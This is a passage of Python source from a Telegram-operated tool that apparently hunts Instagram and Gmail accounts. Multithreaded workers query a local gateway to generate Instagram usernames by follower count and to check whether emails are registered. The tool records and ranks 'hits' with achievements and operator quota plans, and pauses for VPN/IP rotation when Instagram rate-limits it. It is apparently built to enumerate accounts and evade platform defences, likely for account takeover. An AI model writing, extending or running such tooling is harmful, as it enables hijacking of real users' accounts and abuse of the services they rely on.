def fetch_chat_member_profile(group_id, user_id, api_url=None):
    group_id = str(group_id).strip()
    user_id = str(user_id).strip()
    api = api_url or TELEGRAM_API_URL
    if not group_id or not user_id or not api:
        return None
    cache_key = _tg_user_cache_key(user_id, api, member_group=group_id)
    if cache_key in _tg_user_cache:
        return _tg_user_cache.get(cache_key)
    try:
        response = requests.get(
            f"{api}/getChatMember",
            params={"chat_id": group_id, "user_id": user_id},
            timeout=8,
        )
        if not response.ok:
            _tg_user_cache[cache_key] = None
            return None
        user = (response.json().get("result") or {}).get("user") or {}
        info = _telegram_user_info_from_dict(user, user_id)
        _tg_user_cache[cache_key] = info
        return info
    except Exception as exc:
        log_event("TG USER", str(exc)[:80])
        _tg_user_cache[cache_key] = None
        return None


def _telegram_lookup_api_urls():
    urls = []
    token = (_admin_settings.get("admin_bot_token") or "").strip()
    if token:
        urls.append(f"https://api.telegram.org/bot{token}")
    if TELEGRAM_API_URL and TELEGRAM_API_URL not in urls:
        urls.append(TELEGRAM_API_URL)
    return urls


def lookup_telegram_user_display(user_id):
    """Name/username via operator bot, admin bot, or staff group membership."""
    user_id = str(user_id).strip()
    if not user_id:
        return None
    for api in _telegram_lookup_api_urls():
        info = fetch_telegram_user(user_id, api_url=api)
        if info and not _is_placeholder_user_label(info.get("display_name"), user_id):
            return info
    for api in _telegram_lookup_api_urls():
        for group_id in (
            _admin_settings.get("logs_group_id"),
            _admin_settings.get("hits_group_id"),
        ):
            if group_id:
                info = fetch_chat_member_profile(group_id, user_id, api_url=api)
                if info and not _is_placeholder_user_label(info.get("display_name"), user_id):
                    return info
    return None


def resolve_support_contact_html():
    admin_load_settings()
    admin_ids = [str(a) for a in _admin_settings.get("admin_ids", []) if a]
    if not admin_ids:
        return "<i>admin not set</i>"
    uid = admin_ids[0]
    info = lookup_telegram_user_display(uid)
    if info:
        return telegram_profile_link_html(uid, user_info=info)
    return admin_channel_tag()


def telegram_profile_link_html(chat_id, fallback_name=None, user_info=None):
    chat_id = str(chat_id).strip()
    info = user_info
    if not info:
        info = fetch_telegram_user(chat_id)
    if not info and chat_id.lstrip("-").isdigit():
        info = lookup_telegram_user_display(chat_id)
    if info:
        label = html.escape(info["display_name"])
        if info.get("username"):
            href = f"https://t.me/{info['username']}"
        else:
            href = f"tg://user?id={chat_id}"
    else:
        stored = fallback_name if fallback_name and not is_device_style_name(fallback_name) else None
        label = html.escape(stored or "Support")
        href = f"tg://user?id={chat_id}"
    return f'<a href="{href}">{label}</a>'


def sync_operator_name_from_telegram(operator_id):
    if not operator_id or not is_cloud_enabled():
        return
    info = fetch_telegram_user(operator_id)
    if not info:
        return
    profile, err = fetch_profile(operator_id)
    if err:
        return
    if not profile:
        profile = default_profile()
        profile["operator_id"] = str(operator_id)
    profile["display_name"] = info["display_name"]
    upsert_profile(profile)


def schedule_operator_name_sync(operator_id):
    op_id = str(operator_id or "").strip()
    if not op_id or op_id in _synced_operator_ids:
        return
    _synced_operator_ids.add(op_id)
    threading.Thread(
        target=sync_operator_name_from_telegram,
        args=(op_id,),
        daemon=True,
    ).start()


def _sync_operator_display_name(display_name):
    if not is_device_ready():
        return
    oid = resolve_operator_id(TELEGRAM_CHAT_ID)
    info = fetch_telegram_user(oid)
    resolved = (info or {}).get("display_name") if info else display_name
    if not resolved or is_device_style_name(resolved):
        resolved = display_name
    if not resolved:
        return
    profile = default_profile()
    profile["display_name"] = resolved
    upsert_profile(profile)


LAST_UPDATE_ID = 0
paused = False
_user_manual_paused = False
_api_auto_paused = False
_api_last_hunt_ok_at = 0.0
_api_pause_log_at = 0.0
pause_event = threading.Event()
pause_event.clear()
_pause_state_guard = threading.Lock()
_pause_state_updating = False
BOT_POLL_INTERVAL = 2
TG_POLL_HTTP_TIMEOUT = 28
TG_SEND_TIMEOUT = 24 if _IS_TERMUX else 16
TG_HIT_MAX_RETRIES = 12 if _IS_TERMUX else 10
TG_HIT_EDIT_MAX_RETRIES = 6
TG_HIT_RETRY_BASE_SEC = 2.0
HIT_TG_MIN_INTERVAL_SEC = 1.15 if _IS_TERMUX else 0.35
HIT_TG_RETRY_MAX = 20
_hit_tg_last_send_mono = 0.0
_hit_tg_send_lock = threading.Lock()
_hit_tg_retry_pending = []
_hit_tg_retry_lock = threading.Lock()
_hit_tg_retry_started = False
_hit_tg_msg_cache = {}
_hit_tg_user_locks = {}
_hit_tg_user_locks_guard = threading.Lock()
_hit_tg_msg_lock = threading.Lock()
HIT_TG_MSG_CACHE_TTL = 3600
ERROR_LOG_PATH = "log.txt"
_log_file_lock = threading.Lock()
API_TOOL_TIMEOUT = 14
COLOR_SUPPORT = sys.stdout.isatty()
ANSI_RESET = "\033[0m"
ANSI_CYAN = "\033[96m"
ANSI_GREEN = "\033[92m"
ANSI_YELLOW = "\033[93m"
ANSI_RED = "\033[91m"
ANSI_DIM = "\033[2m"
ANSI_MAGENTA = "\033[95m"
ANSI_BLUE = "\033[94m"

gen = 0
valid = 0
hit = 0
errors = 0
START_TIME = datetime.now(timezone.utc)
_last_gen_at = time.monotonic()
_pulse_last_gen = 0
_pulse_last_at = time.monotonic()
_hunt_gateway_meta = {"buffer": None, "ig_block": 0.0, "ig_block_at": 0.0, "updated": 0.0}
_hunt_inflight = 0
_hunt_inflight_lock = threading.Lock()
_hunt_pulse_started = False
event_log = []
event_log_lock = threading.Lock()
MAX_EVENTS = 6
_OPERATOR_HIDDEN_LOG_TYPES = frozenset({"ADMIN HIT", "ADMIN"})


def _operator_log_event_visible(event_type):
    """Admin-internal events never appear in operator panel or TG live feed."""
    et = (event_type or "").strip().upper()
    if et in _OPERATOR_HIDDEN_LOG_TYPES:
        return False
    return not (et.startswith("ADMIN ") or et.startswith("ADMIN."))


def _operator_log_entry_visible(entry):
    text = str(entry).upper()
    return "] ADMIN" not in text


def _operator_visible_events(events):
    return [e for e in events if _operator_log_entry_visible(e)]

LIVE_WATCH = False
LIVE_PANEL = {"chat_id": None, "message_id": None, "view": None}
CMD_REPLY_PANEL = {"chat_id": None, "message_id": None, "is_photo": False}
STARTUP_PANEL = {"chat_id": None, "message_id": None, "has_photo": False}
_startup_loading_discard = {}
_startup_loading_lock = threading.Lock()
_startup_photo_cache = {"bytes": None, "ctype": None, "at": 0.0}
_branding_schedule_keys = set()
LIVE_WATCH_INTERVAL = 5
LIVE_DASHBOARD_CALLBACKS = frozenset({"STATS", "PAUSE", "RESUME", "LIVE_ON"})
HIT_MILESTONES = (250, 500, 1000, 2500, 5000, 10000)
last_milestone_hit = 0

LEADERBOARD_MODE = "operators"

ACHIEVEMENTS = {
    "first_hit": ("First Blood", "First capture logged", "◈"),
    "hits_10": ("Apex Hunter", "250 lifetime hits", "▣▣"),
    "hits_50": ("Warlord", "1,000 lifetime hits", "◆◆"),
    "hits_100": ("Mythic", "5,000 lifetime hits", "★★"),
    "session_10": ("Inferno Run", "75 hits in one session", "▰▰"),
    "session_25": ("Annihilation", "150 hits in one session", "▰▰▰"),
    "speed_20": ("Velocity", "50 hits within 60 minutes", "↻↻"),
    "gen_1k": ("Overclock", "25,000 checks in one session", "⊕⊕"),
    "clean_5": ("Flawless Op", "25 hits, zero errors in one session", "◎◎"),
    "streak_3": ("Iron Will", "14-day active streak", "‖‖"),
    "streak_7": ("Relentless", "30-day active streak", "‖‖‖"),
    "quality_3": ("Bronze Standard", "75× 3★+ quality hits lifetime", "☆☆☆"),
    "quality_4": ("Silver Standard", "40× 4★+ quality hits lifetime", "☆☆☆☆"),
    "quality_5": ("Perfect Hit", "15× 5★ quality hits lifetime", "☆☆☆☆☆"),
    "quality_5_x5": ("Elite Quality", "50× 5★ quality hits lifetime", "★★★★★"),
    "quality_5_x10": ("Transcendent", "150× 5★ quality hits lifetime", "◈◈"),
}

profile_lock = threading.Lock()
_session_hit_times = []
SESSION_HIT_WINDOW_SEC = 3600

lock = threading.Lock()
worker_threads = []
_worker_last_access_sync = 0.0
_workers_started = False

session = requests.Session()
retry_strategy = Retry(
    total=RETRY_TOTAL,
    backoff_factor=0.5,
    status_forcelist=[429, 500, 502, 503, 504],
    allowed_methods=["GET", "POST"],
)
adapter = HTTPAdapter(max_retries=retry_strategy)
session.mount("http://", adapter)
session.mount("https://", adapter)

# Gateway calls: no urllib retries (fail fast when endpoint.py is down)
api_session = requests.Session()
api_session.headers.update({"Connection": "keep-alive"})
def _hunt_gateway_slots_for_threads(count):
    """Cap parallel gateway calls — endpoint.py must allow matching hunt_cycle slots."""
    count = max(1, int(count))
    if _IS_TERMUX:
        cap = globals().get("TERMUX_HUNT_GATEWAY_MAX", 64)
        return min(count, cap)
    cap = globals().get("DESKTOP_HUNT_GATEWAY_MAX", 48)
    return min(count, cap)


def _resize_hunt_gateway_sem(slots):
    """Sync semaphore when /set threads changes — old sem left too few slots (Termux 50/min bug)."""
    global _hunt_gateway_sem, HUNT_GATEWAY_CONCURRENCY
    slots = max(1, int(slots))
    HUNT_GATEWAY_CONCURRENCY = slots
    _hunt_gateway_sem = threading.Semaphore(slots)


def _hunt_http_pool_size():
    return max(_hunt_gateway_slots_for_threads(THREAD_COUNT) + 12, THREAD_COUNT + 8)


_hunt_http_pool = _hunt_http_pool_size()
_api_pool_adapter = HTTPAdapter(
    pool_connections=_hunt_http_pool,
    pool_maxsize=_hunt_http_pool,
    max_retries=Retry(total=0),
    pool_block=False,
)
api_session.mount("http://", _api_pool_adapter)
api_session.mount("https://", _api_pool_adapter)

_api_probe_session = requests.Session()
_api_probe_adapter = HTTPAdapter(
    pool_connections=2,
    pool_maxsize=2,
    max_retries=Retry(total=0),
    pool_block=False,
)
_api_probe_session.mount("http://", _api_probe_adapter)
_api_probe_session.mount("https://", _api_probe_adapter)

_hunt_gateway_sem = threading.Semaphore(HUNT_GATEWAY_CONCURRENCY)
_hit_report_workers = 12 if _IS_TERMUX else 10
_hit_report_executor = ThreadPoolExecutor(
    max_workers=_hit_report_workers,
    thread_name_prefix="hitreport",
)
_hit_gateway_sem = threading.Semaphore(2 if _IS_TERMUX else 4)
_hit_endpoint_enrich_sem = threading.Semaphore(1 if _IS_TERMUX else 2)
_hit_bg_enrich_sem = threading.Semaphore(10 if _IS_TERMUX else 12)
_hit_during_hunt_sem = threading.Semaphore(1 if _IS_TERMUX else 2)
_hit_hunt_contact_sem = threading.Semaphore(1)
_hit_enrich_workers = 4
_hit_enrich_executor = ThreadPoolExecutor(
    max_workers=_hit_enrich_workers,
    thread_name_prefix="hitenrich",
)
_hit_upgrade_workers = 4 if _IS_TERMUX else 6
_hit_upgrade_executor = ThreadPoolExecutor(
    max_workers=_hit_upgrade_workers,
    thread_name_prefix="hitupgrade",
)
_hit_deep_idle_queue = []
_hit_deep_idle_lock = threading.Lock()
_hit_tg_delivery_executor = ThreadPoolExecutor(
    max_workers=3 if _IS_TERMUX else 4,
    thread_name_prefix="hittg",
)

_hit_api_session = requests.Session()
_hit_api_session.headers.update({"Connection": "keep-alive"})
_hit_api_adapter = HTTPAdapter(
    pool_connections=4,
    pool_maxsize=4,
    max_retries=Retry(total=0),
    pool_block=False,
)
_hit_api_session.mount("http://", _hit_api_adapter)
_hit_api_session.mount("https://", _hit_api_adapter)

_hunt_blip_lock = threading.Lock()
_hunt_blip_until = 0.0
_hunt_blip_fail_times = []
_hunt_blip_last_log = 0.0
_hunt_ig_rate_streak = 0
_hunt_ip_change_pause_until = 0.0
_hunt_ip_change_pause_lock = threading.Lock()
_hunt_ip_change_last_log = 0.0


def _hunt_ig_gen_timeout():
    """Buffered /ig_gen is usually instant; short read avoids slot hogging."""
    return (HUNT_CONNECT_TIMEOUT, HUNT_IG_GEN_READ_TIMEOUT)


def _hunt_lookup_timeout():
    return (HUNT_CONNECT_TIMEOUT, HUNT_LOOKUP_READ_TIMEOUT)


def _hunt_request_timeout():
    return (HUNT_CONNECT_TIMEOUT, TIMEOUT)


def _hunt_cycle_request_timeout():
    """Must outlive endpoint lookup budget (38s) — never clip or valid=0 floods."""
    read = HUNT_CYCLE_TIMEOUT
    if not _IS_TERMUX:
        read = max(read, 42)
    return (HUNT_CONNECT_TIMEOUT, read)


def _hunt_worker_backoff_before_cycle():
    """Stagger workers when buffer low or IG lookup cooldown — never use pause_event as sleep."""
    meta = _hunt_gateway_meta
    buf = meta.get("buffer")
    ig_block = float(meta.get("ig_block") or 0)
    rl_streak = int(_hunt_ig_rate_streak)
    if rl_streak >= 20:
        time.sleep(min(1.2 + rl_streak * 0.015, 3.5) + random.uniform(0.05, 0.2))
        return
    if rl_streak >= 8:
        time.sleep(0.25 + rl_streak * 0.02 + random.uniform(0.02, 0.12))
        return
    if ig_block > 1.0:
        time.sleep(min(ig_block * 0.5, 2.0) + random.uniform(0.05, 0.25))
        return
    if isinstance(buf, int):
        if buf <= 0:
            time.sleep(0.35 + random.uniform(0.0, 0.55))
        elif buf < 50:
            time.sleep(0.12 + random.uniform(0.0, 0.2))
        elif buf < HUNT_KEEPALIVE_BUFFER_MIN:
            time.sleep(0.04 + random.uniform(0.0, 0.08))
        # Buffer stocked — drain fast; do not throttle when backlog is high.
    with _hunt_inflight_lock:
        inflight = int(_hunt_inflight)
    drain_lookup = (
        _IS_TERMUX
        and isinstance(buf, int)
        and buf >= TERMUX_BUFFER_NEAR_FULL
    )
    if not drain_lookup and _IS_TERMUX and inflight >= HUNT_GATEWAY_CONCURRENCY:
        time.sleep(0.04 + random.uniform(0.02, 0.12))


def _api_hunt_get(url, timeout, *, hold_slot=False):
    """Gateway GET; hold_slot=True when caller already owns _hunt_gateway_sem."""
    if hold_slot:
        return api_session.get(url, timeout=timeout)
    with _hunt_gateway_sem:
        return api_session.get(url, timeout=timeout)


def _api_hunt_get_retry(url, timeout, *, hold_slot=False, attempts=2):
    last_exc = None
    for attempt in range(attempts):
        try:
            return _api_hunt_get(url, timeout, hold_slot=hold_slot)
        except requests.exceptions.ConnectionError as exc:
            last_exc = exc
            msg = str(exc).lower()
            if attempt + 1 < attempts and (
                "pool" in msg or "connection" in msg
            ):
                time.sleep(0.06 * (attempt + 1))
                continue
            raise
    if last_exc:
        raise last_exc
    raise requests.exceptions.ConnectionError("gateway connection failed")


def _hunt_transient_error(exc):
    if isinstance(
        exc,
        (
            requests.exceptions.Timeout,
            requests.exceptions.ConnectionError,
            requests.exceptions.ChunkedEncodingError,
        ),
    ):
        return True
    msg = str(exc).lower()
    return any(
        token in msg
        for token in (
            "timed out",
            "timeout",
            "connection refused",
            "connection reset",
            "connection aborted",
            "network is unreachable",
            "temporary failure",
            "max retries exceeded",
            "failed to establish",
            "connection pool",
            "too many open files",
        )
    )


def _hunt_in_network_blip():
    return time.time() < _hunt_blip_until


def _is_hunt_ig_rate_limited(ig_msg):
    msg = (ig_msg or "").strip().lower()
    return msg == "rate_limited"


def _hunt_in_ip_change_pause():
    return time.time() < _hunt_ip_change_pause_until


def _hunt_ip_change_pause_left():
    return max(0.0, _hunt_ip_change_pause_until - time.time())


def _clear_hunt_ip_change_pause():
    """After VPN rotate or /resume — drop IG rate-limit cooldown."""
    global _hunt_ip_change_pause_until, _hunt_ig_rate_streak
    with _hunt_ip_change_pause_lock:
        _hunt_ip_change_pause_until = 0.0
        _hunt_ig_rate_streak = 0


def _trigger_hunt_ip_change_pause():
    global _hunt_ip_change_pause_until, _hunt_ig_rate_streak, _hunt_ip_change_last_log
    now = time.time()
    with _hunt_ip_change_pause_lock:
        _hunt_ip_change_pause_until = now + HUNT_IG_RATE_LIMIT_PAUSE_SEC
        _hunt_ig_rate_streak = 0
        if now - _hunt_ip_change_last_log < 30:
            return
        _hunt_ip_change_last_log = now
    secs = int(HUNT_IG_RATE_LIMIT_PAUSE_SEC)
    pause_lbl = f"{secs}s" if secs < 60 else f"{secs // 60}min"
    log_event(
        "IG RATE",
        f"{HUNT_IG_RATE_LIMIT_STREAK_TRIGGER}× rate_limited — hunt paused {pause_lbl} · CHANGE IP",
    )


def _note_hunt_ig_lookup_result(ig_msg):
    """Track consecutive IG rate_limited — pause hunt 2min and show CHANGE IP on panel."""
    global _hunt_ig_rate_streak
    if _hunt_in_ip_change_pause():
        return
    if _is_hunt_ig_rate_limited(ig_msg):
        _hunt_ig_rate_streak += 1
        if _hunt_ig_rate_streak >= HUNT_IG_RATE_LIMIT_STREAK_TRIGGER:
            _trigger_hunt_ip_change_pause()
    else:
        _hunt_ig_rate_streak = 0


def _hunt_recently_ok():
    """Recent successful hunt_cycle — gateway is up even if VPN blip failed a probe."""
    if _hunt_in_network_blip():
        return True
    return (time.time() - _api_last_hunt_ok_at) < API_HUNT_ALIVE_GRACE_SEC


def _endpoint_hard_down_error(exc):
    """Only endpoint.py not running — not VPN timeouts on localhost hunt_cycle."""
    if isinstance(exc, requests.exceptions.ConnectionError):
        msg = str(exc).lower()
        return (
            "connection refused" in msg
            or "failed to establish a new connection" in msg
        )
    return False


def _mark_api_alive_from_hunt_success():
    global _api_probe_fail_streak, _api_auto_paused, _api_last_hunt_ok_at, _hunt_blip_until
    _api_last_hunt_ok_at = time.time()
    _hunt_blip_until = 0.0
    _api_probe_fail_streak = 0
    with _health_lock:
        _health_cache["api"] = True
        _health_cache["api_base"] = f"http://{ip}:{port}"
        _health_cache["api_via"] = "local" if ip in ("127.0.0.1", "localhost") else "public"
        _health_cache["api_at"] = time.time()
    if _api_auto_paused:
        _api_auto_paused = False
        _log_api_pause_change("API online — hunt recovered")
        apply_worker_pause_state()


def _log_api_pause_change(message):
    global _api_pause_log_at
    now = time.time()
    if now - _api_pause_log_at < 20:
        return
    _api_pause_log_at = now
    log_event("CONFIG", message)


def _mark_api_dead_from_hunt(exc):
    """VPN/IP rotate causes hunt timeouts — never instant-pause from those."""
    global _api_probe_fail_streak
    if _hunt_recently_ok():
        return
    if not _endpoint_hard_down_error(exc):
        return
    msg = str(exc).lower()
    if not any(token in msg for token in ("127.0.0.1", "localhost", f":{port}")):
        return
    _api_probe_fail_streak += 1
    if _api_probe_fail_streak < API_PROBE_FAIL_THRESHOLD:
        return
    global _api_auto_paused
    with _health_lock:
        _health_cache["api"] = False
        _health_cache["api_base"] = None
        _health_cache["api_via"] = None
        _health_cache["api_at"] = time.time()
    if not _api_auto_paused:
        _api_auto_paused = True
        _log_api_pause_change("Auto-paused — endpoint.py not running")
    apply_worker_pause_state()


def _hunt_register_transient_fail():
    global _hunt_blip_until, _hunt_blip_last_log
    now = time.time()
    with _hunt_blip_lock:
        _hunt_blip_fail_times.append(now)
        cutoff = now - HUNT_BLIP_WINDOW_SEC
        _hunt_blip_fail_times[:] = [t for t in _hunt_blip_fail_times if t >= cutoff]
        if len(_hunt_blip_fail_times) < HUNT_BLIP_TRIGGER:
            return
        _hunt_blip_until = max(_hunt_blip_until, now + HUNT_BLIP_PAUSE_SEC)
        if now - _hunt_blip_last_log < 20:
            return
        _hunt_blip_last_log = now
    log_event("NET BLIP", f"link pause {HUNT_BLIP_PAUSE_SEC:.0f}s (VPN/IP rotate?)")


def apply_color(text, color):
    return f"{color}{text}{ANSI_RESET}" if COLOR_SUPPORT else text


def rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m"


def gradient_line(text, start, end):
    if not COLOR_SUPPORT or not text:
        return text
    r1, g1, b1 = start
    r2, g2, b2 = end
    out = []
    width = max(len(text) - 1, 1)
    for i, ch in enumerate(text):
        t = i / width
        r = int(r1 + (r2 - r1) * t)
        g = int(g1 + (g2 - g1) * t)
        b = int(b1 + (b2 - b1) * t)
        out.append(f"{rgb(r, g, b)}{ch}")
    return "".join(out) + ANSI_RESET


BANNER_LOGO = [
    "     ██╗███╗   ██╗██████╗  █████╗ ██████╗ ███████╗████████╗ ██████╗ ",
    "     ██║████╗  ██║██╔══██╗██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔═══██╗",
    "     ██║██╔██╗ ██║██████╔╝███████║██████╔╝█████╗     ██║   ██║   ██║",
    "     ██║██║╚██╗██║██╔═══╝ ██╔══██║██╔══██╗██╔══╝     ██║   ██║   ██║",
    "     ██║██║ ╚████║██║     ██║  ██║██║  ██║███████╗   ██║   ╚██████╔╝",
    "     ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝ ",
]

JOINT_BADGE = [
    "        ╭──────────────────────────────────────────────╮",
    
    "        │  ◆  Developed & Maintained by S Crew  ◆      │",
    "        ╰──────────────────────────────────────────────╯",
]

LOGO_PALETTE = [
    ((0, 255, 255), (0, 140, 255)),
    ((0, 220, 255), (80, 90, 255)),
    ((100, 180, 255), (140, 60, 255)),
    ((160, 120, 255), (200, 40, 255)),
    ((200, 80, 255), (255, 60, 200)),
    ((255, 40, 180), (255, 80, 120)),
]


def paint_logo_lines(badge_lines):
    lines = []
    for idx, row in enumerate(BANNER_LOGO):
        start, end = LOGO_PALETTE[idx]
        lines.append("  " + gradient_line(row, start, end))
    for row in badge_lines:
        lines.append(apply_color(row, ANSI_MAGENTA))
    return lines


def visible_len(text):
    return len(re.sub(r"\033\[[0-9;]*m", "", text))


def pad_value(value, width):
    pad = max(width - visible_len(value), 0)
    return f"{value}{' ' * pad}"


def line_pad_visible(line, width):
    return line + (" " * max(width - visible_len(line), 0))


def _card_inner_w(label_w, value_w):
    return label_w + value_w + 3


def _fit_label(label, label_w):
    label = str(label)
    if len(label) <= label_w:
        return label
    return label[: max(label_w - 1, 1)] + "…"


def card_blank_body(label_w, value_w):
    left = f"  │ {' ' * label_w}│ "
    right = f"{' ' * value_w}│"
    return apply_color(left, ANSI_DIM) + apply_color(right, ANSI_DIM)


def pad_card_lines(lines, target_len, label_w, value_w):
    if len(lines) >= target_len:
        return lines
    top, bottom = lines[0], lines[-1]
    body = lines[1:-1]
    while len(body) + 2 < target_len:
        body.append(card_blank_body(label_w, value_w))
    return [top, *body, bottom]


def paint_info_card(rows, label_w=11, value_w=34):
    inner_w = _card_inner_w(label_w, value_w)
    top = apply_color(f"  ╭{'─' * inner_w}╮", ANSI_CYAN)
    bottom = apply_color(f"  ╰{'─' * inner_w}╯", ANSI_CYAN)
    body = []
    for label, value, color in rows:
        left = f"  │ {_fit_label(label, label_w):<{label_w}}│ "
        right = f"{pad_value(str(value), value_w)}│"
        if color is None:
            body.append(apply_color(left, ANSI_DIM) + right)
        else:
            body.append(apply_color(left, ANSI_DIM) + apply_color(right, color))
    return [top, *body, bottom]


ACTION_BOX_W = 73
ACTION_INNER = 67


def clip_plain(text, max_len):
    plain = re.sub(r"\033\[[0-9;]*m", "", str(text))
    if len(plain) <= max_len:
        return plain
    return plain[: max_len - 1] + "…"


def paint_action_box(title, lines, border_color=ANSI_YELLOW):
    head = f"  ┌─ {title} "
    dashes = max(ACTION_BOX_W - len(head) - 1, 0)
    out = [apply_color(head + "─" * dashes + "┐", border_color)]
    for text, color in lines:
        body = clip_plain(text, ACTION_INNER)
        out.append(apply_color(f"  │  {body:<{ACTION_INNER}}│", color))
    out.append(apply_color(f"  └{'─' * (ACTION_BOX_W - 4)}┘", border_color))
    return out


def _terminal_verify_line(label, detail, color):
    """paint_action_box expects (text, color) pairs."""
    return (f"{label}: {detail}", color)


def render_keyboard_exit(*, via_menu=False):
    clear_console()
    print()
    print(gradient_line("  ◆  S H U T D O W N  ◆  ", (255, 80, 90), (255, 170, 110)))
    print()
    stop_line = (
        "Menu quit — process stopped (not running in background)."
        if via_menu
        else "Ctrl+C received — archiving session to cloud."
    )
    for line in paint_action_box(
        "SESSION STOPPED",
        [
            (stop_line, ANSI_YELLOW),
            ("Telegram + hunt workers stop with this process.", ANSI_DIM),
            ("Start again:  python endpoint.py  then  python joint.py", ANSI_CYAN),
        ],
        ANSI_RED,
    ):
        print(line)
    print(apply_color("  Safe exit complete.\n", ANSI_DIM))


def shutdown_joint_session(*, via_menu=False):
    """Full stop — workers/Telegram do not keep running after menu quit."""
    global paused, _user_manual_paused, JACK_PANEL_LIVE
    JACK_PANEL_LIVE = False
    _panel_refresh_stop.set()
    _panel_leave_alt_screen()
    paused = True
    _user_manual_paused = True
    pause_event.clear()
    apply_worker_pause_state(defer_access=True)
    try:
        profile_archive_session()
    except Exception:
        pass
    render_keyboard_exit(via_menu=via_menu)
    sys.exit(0)


def make_colored_bar(current, total, width=20, fill_color=ANSI_GREEN):
    if total <= 0:
        return apply_color("─" * width, ANSI_DIM)
    filled = min(width, int((current / total) * width))
    if not COLOR_SUPPORT:
        return ("▰" * filled) + ("─" * (width - filled))
    return apply_color("▰" * filled, fill_color) + apply_color("─" * (width - filled), ANSI_DIM)


def print_cards(cards, label_w=11, value_w=34):
    for rows in cards:
        for line in paint_info_card(rows, label_w, value_w):
            print(line)
        print()


def _cards_side_by_side_lines(left_rows, right_rows, label_w=10, value_w=19, gap=4):
    left_lines = paint_info_card(left_rows, label_w, value_w)
    right_lines = paint_info_card(right_rows, label_w, value_w)
    target_len = max(len(left_lines), len(right_lines))
    left_lines = pad_card_lines(left_lines, target_len, label_w, value_w)
    right_lines = pad_card_lines(right_lines, target_len, label_w, value_w)
    col_w = max(max(visible_len(line) for line in left_lines), max(visible_len(line) for line in right_lines))
    lines = []
    for left, right in zip(left_lines, right_lines):
        lines.append(line_pad_visible(left, col_w) + (" " * gap) + line_pad_visible(right, col_w))
    lines.append("")
    return lines


def print_cards_side_by_side(left_rows, right_rows, label_w=10, value_w=19, gap=4):
    for line in _cards_side_by_side_lines(left_rows, right_rows, label_w, value_w, gap):
        print(line)


def _local_gateway_mode():
    return str(ip or "") in ("127.0.0.1", "localhost", "")


def api_target_hosts():
    hosts = []
    p = str(port or "5001")
    for candidate in (f"127.0.0.1:{p}", f"localhost:{p}"):
        if candidate not in hosts:
            hosts.append(candidate)
    if ip and ip not in ("127.0.0.1", "localhost"):
        remote = f"{ip}:{p}"
        if remote not in hosts:
            hosts.append(remote)
    return hosts


def get_api_base_url():
    with _health_lock:
        if _health_cache.get("api_base"):
            return _health_cache["api_base"]
    return f"http://127.0.0.1:{port}"


def api_request_bases():
    bases = []
    primary = get_api_base_url()
    if primary:
        bases.append(primary.rstrip("/"))
    for host in api_target_hosts():
        base = f"http://{host}".rstrip("/")
        if base not in bases:
            bases.append(base)
    return bases


def refresh_api_probe(force=False):
    with _health_lock:
        age = time.time() - _health_cache.get("api_at", 0)
        if not force and _health_cache["api"] is not None and age < PROBE_INTERVAL_OK:
            return bool(_health_cache["api"])
    _run_api_probe()
    return get_api_alive()


def api_fetch_json(path, params=None, timeout=None):
    if not get_api_alive():
        tried = ", ".join(api_target_hosts())
        return None, (
            "API offline — start endpoint.py on this PC:\n"
            f"<code>python endpoint.py</code>\n"
            f"<i>Probed: {html.escape(tried)}</i>"
        )
    query = ""
    if params:
        query = "&".join(f"{k}={quote(str(v))}" for k, v in params.items())
    path = path if path.startswith("/") else f"/{path}"
    suffix = f"{path}?{query}" if query else path
    req_timeout = timeout or API_TOOL_TIMEOUT
    last_err = None
    for base in api_request_bases():
        url = f"{base}{suffix}"
        try:
            response = api_session.get(url, timeout=req_timeout)
            response.raise_for_status()
            return response.json(), None
        except Exception as exc:
            last_err = str(exc)[:100]
            continue
    if not get_api_alive():
        sync_api_auto_pause()
    return None, last_err or "API unreachable on all hosts"


def normalize_lookup_email(raw):
    email = (raw or "").strip().lower()
    if not email or "@" not in email:
        return None
    return email


def format_lookup_result(kind, email, data, err=None):
    if err:
        return format_action_notice(f"{kind} lookup failed", err, "ERR")
    status = data.get("status")
    state = f"{S['live']} YES" if status is True else (
        f"{S['idle']} NO" if status is False else str(status)
    )
    lines = [
        format_panel_header(),
        f"<b>◈ {kind.upper()} LOOKUP</b>\n\n",
        tg_row("Email", html.escape(email)),
        tg_row("Status", state),
    ]
    response_text = data.get("response")
    if response_text:
        snippet = html.escape(str(response_text)[:240])
        lines.append(f"\n<i>{snippet}</i>\n")
    if kind == "insta" and data.get("username"):
        user = html.escape(str(data["username"]))
        lines.append(tg_row("Username", f"@{user}"))
    return "".join(lines)


def cmd_lookup_gmail(email):
    data, err = api_fetch_json("/gmail_lookup", {"email": email})
    if err:
        return format_lookup_result("gmail", email, {}, err)
    return format_lookup_result("gmail", email, data)


def cmd_lookup_insta(email):
    data, err = api_fetch_json(HUNT_IG_LOOKUP_ROUTE, {"email": email})
    if err:
        return format_lookup_result("insta", email, {}, err)
    return format_lookup_result("insta", email, data)


def cmd_generate_batch(count, min_followers):
    count = max(1, min(GEN_CMD_MAX_COUNT, int(count)))
    min_followers = max(1, min(GEN_CMD_MAX_MIN, int(min_followers)))
    if TELEGRAM_ENABLED:
        ok, reason, info = plan_can_hunt()
        if not ok:
            return format_operator_plan_gate(reason or "daily_limit", info or {})
    lines = [
        format_panel_header(),
        f"<b>◈ GENERATE · {count}×</b>\n\n",
        tg_row("Min followers", str(min_followers)),
        tg_row("API", get_api_base_url() or "—"),
        "\n",
    ]
    errors = 0
    for idx in range(1, count + 1):
        if TELEGRAM_ENABLED:
            ok, reason, pinfo = plan_acquire_generation()
            if not ok:
                lines.append(
                    f"  {S['bullet']} <code>#{idx}</code>  "
                    f"<i>{html.escape(reason or 'quota')}</i>\n"
                )
                break
            quota_held = True
        else:
            quota_held = False
        if not get_api_alive():
            lines.append(
                f"  {S['bullet']} <code>#{idx}</code>  "
                f"<i>API offline — hunt auto-paused · start endpoint.py</i>\n"
            )
            break
        data, err = api_fetch_json(
            "/ig_gen",
            {"min": min_followers},
            timeout=_hunt_tool_timeout(),
        )
        if err:
            if quota_held:
                plan_release_generation()
            lines.append(f"  {S['bullet']} <code>#{idx}</code>  <i>{html.escape(err)}</i>\n")
            errors += 1
            if not get_api_alive() or "API offline" in err:
                break
            continue
        username = data.get("username") or "—"
        if quota_held and (not username or username == "—"):
            plan_release_generation()
        info = data.get("info") or {}
        name = html.escape(str(info.get("full_name") or "—"))
